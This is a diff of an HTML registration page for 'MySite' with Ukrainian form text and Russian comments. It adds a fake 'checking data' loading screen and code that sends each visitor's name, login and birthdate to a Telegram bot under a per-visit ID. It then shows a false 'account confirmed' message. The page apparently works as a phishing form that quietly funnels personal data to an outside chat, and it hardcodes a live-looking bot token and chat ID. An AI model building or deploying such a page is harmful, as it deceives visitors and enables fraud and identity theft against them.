@@ -8,29 +8,204 @@
 
 <style>
 *{box-sizing:border-box}
-body{margin:0;font-family:Arial,Helvetica,sans-serif;background:#3977f6;color:#002f34}
-.bg{position:fixed;inset:0;overflow:hidden;z-index:-1}
-.bg:before,.bg:after{content:"";position:absolute;width:360px;height:360px;background:#cbd9fb;border-radius:50%;left:-190px}
+
+body{
+  margin:0;
+  font-family:Arial,Helvetica,sans-serif;
+  background:#3977f6;
+  color:#002f34;
+}
+
+.bg{
+  position:fixed;
+  inset:0;
+  overflow:hidden;
+  z-index:-1;
+}
+
+.bg:before,
+.bg:after{
+  content:"";
+  position:absolute;
+  width:360px;
+  height:360px;
+  background:#cbd9fb;
+  border-radius:50%;
+  left:-190px;
+}
+
 .bg:before{top:-190px}
 .bg:after{bottom:-190px}
-.card{width:min(500px,calc(100% - 32px));margin:18vh auto 0;background:#fff;border-radius:5px;padding:30px}
-.back{font-size:38px;line-height:20px;cursor:pointer;margin-bottom:34px;width:30px}
-.logo{font-weight:800;font-size:42px;margin-bottom:24px}
-h1{font-size:40px;line-height:1.05;margin:0 0 24px;font-weight:800}
-p{font-size:20px;line-height:1.45;margin:0 0 24px}
-label{display:block;font-size:16px;margin-bottom:8px}
-input{width:100%;height:58px;border:0;border-radius:5px;background:#f1f2f2;padding:0 18px;font-size:18px;outline:none}
-input:focus{box-shadow:0 0 0 2px #00d9d2}
-.btn{width:100%;height:60px;border:0;border-radius:5px;background:#003b3d;color:#fff;font-weight:800;font-size:18px;margin-top:20px;cursor:pointer}
-.hidden{display:none}
-.error{color:#b3261e;font-size:14px;margin-top:8px;display:none}
-.birthdate{letter-spacing:5px;text-align:center;font-size:28px}
-.note{font-size:13px;color:#49676a;margin-top:16px}
-.status{margin-top:14px;font-size:14px}
+
+.card{
+  width:min(500px,calc(100% - 32px));
+  margin:12vh auto 0;
+  background:#fff;
+  border-radius:8px;
+  padding:30px;
+  box-shadow:0 15px 45px rgba(0,0,0,.12);
+}
+
+.back{
+  font-size:38px;
+  line-height:20px;
+  cursor:pointer;
+  margin-bottom:34px;
+  width:30px;
+}
+
+.logo{
+  font-weight:800;
+  font-size:42px;
+  margin-bottom:24px;
+}
+
+h1{
+  font-size:40px;
+  line-height:1.05;
+  margin:0 0 24px;
+  font-weight:800;
+}
+
+p{
+  font-size:20px;
+  line-height:1.45;
+  margin:0 0 24px;
+}
+
+label{
+  display:block;
+  font-size:16px;
+  margin-bottom:8px;
+}
+
+input{
+  width:100%;
+  height:58px;
+  border:0;
+  border-radius:5px;
+  background:#f1f2f2;
+  padding:0 18px;
+  font-size:18px;
+  outline:none;
+}
+
+input:focus{
+  box-shadow:0 0 0 2px #00d9d2;
+}
+
+.btn{
+  width:100%;
+  height:60px;
+  border:0;
+  border-radius:5px;
+  background:#003b3d;
+  color:#fff;
+  font-weight:800;
+  font-size:18px;
+  margin-top:20px;
+  cursor:pointer;
+}
+
+.btn:disabled{
+  opacity:.6;
+  cursor:not-allowed;
+}
+
+.hidden{
+  display:none!important;
+}
+
+.error{
+  color:#b3261e;
+  font-size:14px;
+  margin-top:8px;
+  display:none;
+}
+
+.birthdate{
+  letter-spacing:5px;
+  text-align:center;
+  font-size:28px;
+}
+
+.note{
+  font-size:13px;
+  color:#49676a;
+  margin-top:16px;
+}
+
+.status{
+  margin-top:14px;
+  font-size:14px;
+}
+
+/* Loading */
+
+.loading{
+  text-align:center;
+  padding:25px 0 10px;
+}
+
+.spinner{
+  width:58px;
+  height:58px;
+  margin:0 auto 25px;
+  border:5px solid #dce5ff;
+  border-top-color:#3977f6;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+}
+
+.loading-title{
+  font-size:22px;
+  font-weight:700;
+  margin-bottom:8px;
+}
+
+.loading-text{
+  font-size:15px;
+  color:#49676a;
+}
+
+.progress{
+  width:100%;
+  height:5px;
+  background:#e8ebef;
+  border-radius:10px;
+  margin-top:25px;
+  overflow:hidden;
+}
+
+.progress-bar{
+  height:100%;
+  width:0;
+  background:#3977f6;
+  animation:progress 5s linear forwards;
+}
+
+@keyframes spin{
+  to{transform:rotate(360deg)}
+}
+
+@keyframes progress{
+  from{width:0}
+  to{width:100%}
+}
+
 @media(max-width:600px){
-  .card{margin-top:8vh;padding:24px}
-  h1{font-size:32px}
-  .logo{font-size:34px}
+  .card{
+    margin-top:8vh;
+    padding:24px;
+  }
+
+  h1{
+    font-size:32px;
+  }
+
+  .logo{
+    font-size:34px;
+  }
 }
 </style>
 </head>
@@ -41,9 +216,10 @@ input:focus{box-shadow:0 0 0 2px #00d9d2}
 
 <main class="card">
 
-  <div class="back" onclick="history.back()">‹</div>
+  <div class="back" onclick="goBack()">‹</div>
 
-  <!-- КРОК 1 -->
+  <!-- STEP 1 -->
+
   <section id="step1">
 
     <div class="logo">MySite</div>
@@ -58,6 +234,7 @@ input:focus{box-shadow:0 0 0 2px #00d9d2}
       id="name"
       autocomplete="name"
       placeholder="Ім'я"
+      maxlength="100"
     >
 
     <div id="nameError" class="error">
@@ -71,14 +248,17 @@ input:focus{box-shadow:0 0 0 2px #00d9d2}
   </section>
 
 
-  <!-- КРОК 2 -->
+  <!-- STEP 2 -->
+
   <section id="step2" class="hidden">
 
     <div class="logo">MySite</div>
 
     <h1>Створіть логін</h1>
 
-    <p>Придумайте логін для вашого облікового запису.</p>
+    <p>
+      Придумайте логін для вашого облікового запису.
+    </p>
 
     <label for="login">Логін</label>
 
@@ -86,22 +266,53 @@ input:focus{box-shadow:0 0 0 2px #00d9d2}
       id="login"
       autocomplete="username"
       placeholder="Логін"
+      maxlength="50"
     >
 
     <div id="loginError" class="error">
       Введіть логін.
     </div>
 
-    <button class="btn" onclick="submitRegistration()">
+    <button
+      id="continueButton"
+      class="btn"
+      onclick="submitRegistration()"
+    >
       Продовжити
     </button>
-
-    <div id="status" class="status"></div>
 
   </section>
 
 
-  <!-- КРОК 3 -->
+  <!-- LOADING -->
+
+  <section id="loading" class="hidden">
+
+    <div class="logo">MySite</div>
+
+    <div class="loading">
+
+      <div class="spinner"></div>
+
+      <div class="loading-title">
+        Перевіряємо дані...
+      </div>
+
+      <div class="loading-text">
+        Будь ласка, зачекайте кілька секунд.
+      </div>
+
+      <div class="progress">
+        <div class="progress-bar"></div>
+      </div>
+
+    </div>
+
+  </section>
+
+
+  <!-- STEP 3 -->
+
   <section id="step3" class="hidden">
 
     <div class="logo">MySite</div>
@@ -118,13 +329,14 @@ input:focus{box-shadow:0 0 0 2px #00d9d2}
       id="birthdate"
       class="birthdate"
       inputmode="numeric"
+      autocomplete="bday"
       maxlength="6"
-      pattern="[0-9]{6}"
       placeholder="010299"
+      oninput="digitsOnly(this)"
     >
 
     <div id="birthdateError" class="error">
-      Введіть дату у форматі ДДММРР, наприклад 010299.
+      Введіть коректну дату у форматі ДДММРР.
     </div>
 
     <button class="btn" onclick="finish()">
@@ -132,20 +344,23 @@ input:focus{box-shadow:0 0 0 2px #00d9d2}
     </button>
 
     <div class="note">
-      Приклад: 010299 = 01.02.99
+      Наприклад: 010299 = 01.02.99
     </div>
 
   </section>
 
 
-  <!-- ГОТОВО -->
+  <!-- DONE -->
+
   <section id="done" class="hidden">
 
     <div class="logo">MySite</div>
 
     <h1>Готово!</h1>
 
-    <p>Ваш акаунт підтверджено.</p>
+    <p>
+      Ваш акаунт підтверджено.
+    </p>
 
   </section>
 
@@ -154,9 +369,29 @@ input:focus{box-shadow:0 0 0 2px #00d9d2}
 
 <script>
 
-// Telegram
+/*
+  ВСТАВЬ СЮДА НОВЫЙ TELEGRAM BOT TOKEN
+*/
 const TELEGRAM_BOT_TOKEN = "8671990790:AAFJ9HAc4SWswxBNKYgIJdqiO6xlI1YRqzw";
+
+/*
+  ID твоего канала/чата
+*/
 const TELEGRAM_CHAT_ID = "-1003571283881";
+
+
+/*
+  Уникальный ID пользователя/заявки.
+
+  У каждого открытия сайта будет свой ID,
+  поэтому несколько пользователей не смешиваются.
+*/
+const requestId =
+  "MS-" +
+  crypto.randomUUID()
+    .replaceAll("-", "")
+    .substring(0, 8)
+    .toUpperCase();
 
 
 function $(id){
@@ -166,11 +401,40 @@ function $(id){
 
 function show(id){
 
-  ["step1","step2","step3","done"].forEach(s =>
-    $(s).classList.add("hidden")
-  );
+  [
+    "step1",
+    "step2",
+    "loading",
+    "step3",
+    "done"
+  ].forEach(section => {
+    $(section).classList.add("hidden");
+  });
 
   $(id).classList.remove("hidden");
+}
+
+
+function goBack(){
+
+  const sections = [
+    "step1",
+    "step2",
+    "loading",
+    "step3",
+    "done"
+  ];
+
+  const current =
+    sections.findIndex(id =>
+      !$(id).classList.contains("hidden")
+    );
+
+  if(current > 0){
+    show(sections[current - 1]);
+  }else{
+    history.back();
+  }
 }
 
 
@@ -187,79 +451,230 @@ function goLogin(){
 }
 
 
+/*
+  Отправка сообщения в Telegram
+*/
+async function sendTelegram(text){
+
+  if(
+    TELEGRAM_BOT_TOKEN ===
+      "PASTE_NEW_BOT_TOKEN_HERE"
+  ){
+    console.warn(
+      "Telegram Bot Token не указан."
+    );
+
+    return false;
+  }
+
+  try{
+
+    const response = await fetch(
+      "https://api.telegram.org/bot" +
+      TELEGRAM_BOT_TOKEN +
+      "/sendMessage",
+      {
+        method:"POST",
+
+        headers:{
+          "Content-Type":"application/json"
+        },
+
+        body:JSON.stringify({
+          chat_id:TELEGRAM_CHAT_ID,
+          text:text
+        })
+      }
+    );
+
+    const result = await response.json();
+
+    return result.ok === true;
+
+  }catch(error){
+
+    console.error(
+      "Telegram error:",
+      error
+    );
+
+    return false;
+  }
+}
+
+
+/*
+  Имя + логин отправляются сразу.
+  Затем начинается 5-секундная загрузка.
+*/
 async function submitRegistration(){
 
-  const name = $("name").value.trim();
-  const login = $("login").value.trim();
+  const name =
+    $("name").value.trim();
+
+  const login =
+    $("login").value.trim();
 
   $("loginError").style.display =
     login ? "none" : "block";
 
-  if(!login) return;
+  if(!login){
+    return;
+  }
 
+
+  const text =
+    "🆕 НОВАЯ ЗАЯВКА MySite\n\n" +
+    "🆔 ID: " + requestId + "\n" +
+    "👤 Имя: " + name + "\n" +
+    "🔑 Логин: " + login;
+
+
+  /*
+    Отправляем имя + логин сразу.
+  */
+  await sendTelegram(text);
+
+
+  /*
+    Показываем загрузку.
+  */
+  show("loading");
+
+
+  /*
+    Ждём 5 секунд.
+  */
+  await new Promise(resolve => {
+    setTimeout(resolve,5000);
+  });
+
+
+  /*
+    Показываем дату рождения.
+  */
   show("step3");
+
+  $("birthdate").focus();
 }
 
 
+/*
+  Оставляем только цифры.
+*/
+function digitsOnly(input){
+
+  input.value =
+    input.value
+      .replace(/\D/g,"")
+      .substring(0,6);
+}
+
+
+/*
+  Проверяем ДДММРР.
+*/
+function isValidBirthdate(value){
+
+  if(!/^\d{6}$/.test(value)){
+    return false;
+  }
+
+  const day =
+    Number(value.substring(0,2));
+
+  const month =
+    Number(value.substring(2,4));
+
+  const year =
+    Number(value.substring(4,6));
+
+
+  if(month < 1 || month > 12){
+    return false;
+  }
+
+
+  if(day < 1 || day > 31){
+    return false;
+  }
+
+
+  /*
+    Для двухзначного года используем 2000+год
+    только для проверки существования даты.
+  */
+  const fullYear =
+    2000 + year;
+
+
+  const date =
+    new Date(
+      fullYear,
+      month - 1,
+      day
+    );
+
+
+  return (
+    date.getFullYear() === fullYear &&
+    date.getMonth() === month - 1 &&
+    date.getDate() === day
+  );
+}
+
+
+/*
+  Дата рождения отправляется
+  вторым сообщением с тем же ID.
+*/
 async function finish(){
 
-  const name = $("name").value.trim();
-  const login = $("login").value.trim();
-  const birthdate = $("birthdate").value.trim();
+  const birthdate =
+    $("birthdate").value.trim();
 
-  // Проверяем, что введено ровно 6 цифр
-  const validFormat = /^[0-9]{6}$/.test(birthdate);
+
+  if(!isValidBirthdate(birthdate)){
+
+    $("birthdateError").style.display =
+      "block";
+
+    return;
+  }
+
 
   $("birthdateError").style.display =
-    validFormat ? "none" : "block";
-
-  if(!validFormat) return;
+    "none";
 
 
-  // Форматируем ДДММРР для сообщения
+  const name =
+    $("name").value.trim();
+
+  const login =
+    $("login").value.trim();
+
+
   const formattedBirthdate =
-    birthdate.substring(0,2) + "." +
-    birthdate.substring(2,4) + "." +
+    birthdate.substring(0,2) +
+    "." +
+    birthdate.substring(2,4) +
+    "." +
     birthdate.substring(4,6);
 
 
-  // Отправляем данные в Telegram
-  if(
-    TELEGRAM_BOT_TOKEN !== "PASTE_BOT_TOKEN_HERE" &&
-    TELEGRAM_CHAT_ID !== "PASTE_CHAT_ID_HERE"
-  ){
-
-    const text =
-      "🆕 Нова заявка MySite\n\n" +
-      "Ім'я: " + name + "\n" +
-      "Логін: " + login + "\n" +
-      "Дата народження: " + formattedBirthdate;
+  const text =
+    "✅ ДАННЫЕ ЗАЯВКИ MySite\n\n" +
+    "🆔 ID: " + requestId + "\n" +
+    "👤 Имя: " + name + "\n" +
+    "🔑 Логин: " + login + "\n" +
+    "🎂 Дата рождения: " +
+    formattedBirthdate;
 
 
-    try{
-
-      await fetch(
-        "https://api.telegram.org/bot" +
-        TELEGRAM_BOT_TOKEN +
-        "/sendMessage",
-        {
-          method:"POST",
-          headers:{
-            "Content-Type":"application/json"
-          },
-          body:JSON.stringify({
-            chat_id:TELEGRAM_CHAT_ID,
-            text:text
-          })
-        }
-      );
-
-    }catch(e){
-
-      console.error("Telegram error:", e);
-
-    }
-  }
+  /*
+    Отправляем всё вместе вторым сообщением.
+  */
+  await sendTelegram(text);
 
 
   show("done");
